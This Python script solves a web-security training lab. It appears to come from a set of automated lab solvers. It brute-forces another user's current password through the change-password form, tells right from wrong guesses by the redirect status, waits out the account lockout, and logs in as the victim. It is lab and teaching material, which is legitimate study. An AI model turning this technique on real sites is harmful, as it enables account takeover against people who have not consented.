from web_security_academy.core.utils import auth_lab_passwords
from web_security_academy.core.logger import logger
from time import sleep


def solve_lab(session):
    passwords = auth_lab_passwords()
    logger.info(
        "Attempting to change Carlos's password (Requires his current password)..."
    )

    logger.toggle_newline()
    for password in passwords:
        session.post_path("/logout")
        session.post_path("/login", data={"username": "wiener", "password": "peter"})

        data = {
            "username": "carlos",
            "current-password": password,
            "new-password-1": password,
            "new-password-2": password,
        }
        resp = session.post_path(
            "/my-account/change-password",
            data=data,
            allow_redirects=False,
        )

        if resp.status_code == 302:
            logger.info(f"{password} => Incorrect password")
        else:
            logger.success(f"{password} => Password changed successfully!")
            logger.toggle_newline()
            break
    else:
        logger.failure("Unable to find Carlos's current password.")
        logger.toggle_newline()
        return

    logger.info("Sleeping for 1 minute to remove account lock...")
    sleep(60)
    session.login("carlos", password, with_csrf=False)
